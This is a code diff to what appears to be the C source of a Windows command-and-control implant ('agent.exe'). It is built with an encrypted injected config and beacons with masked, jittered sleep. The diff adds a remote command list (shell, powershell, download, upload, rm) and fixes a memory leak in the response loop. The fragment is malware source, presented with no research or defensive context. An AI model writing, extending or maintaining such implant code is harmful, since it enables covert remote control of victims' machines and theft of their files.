@@ -3,6 +3,7 @@
  * Build (config injected):
  *   zig cc -target x86_64-windows-gnu -O2 -s *.c cJSON.c \
  *     -DCFG_BLOB=".." -DCFG_KEY=".." -DCFG_NONCE=".." \
+ *     -DCFG_COMMANDS="shell,powershell,sleep,ls,download,upload,rm,mkdir,exit" \
  *     -lwinhttp -lbcrypt -liphlpapi -o agent.exe
  */
 #include "common.h"
@@ -100,15 +101,19 @@ int main(void) {
         }
         tasks_free(tasks, count);
         if (agent_post_responses(&a, resps, count) != 0) {
-            for (i = 0; i < count; i++)
+            for (i = 0; i < count; i++) {
                 free(outputs[i]);
+                free(resps[i].extra_json);
+            }
             free(outputs);
             free(resps);
             masked_sleep(&a, a.interval, a.jitter);
             continue;
         }
-        for (i = 0; i < count; i++)
+        for (i = 0; i < count; i++) {
             free(outputs[i]);
+            free(resps[i].extra_json);
+        }
         free(outputs);
         free(resps);
         if (exit) {
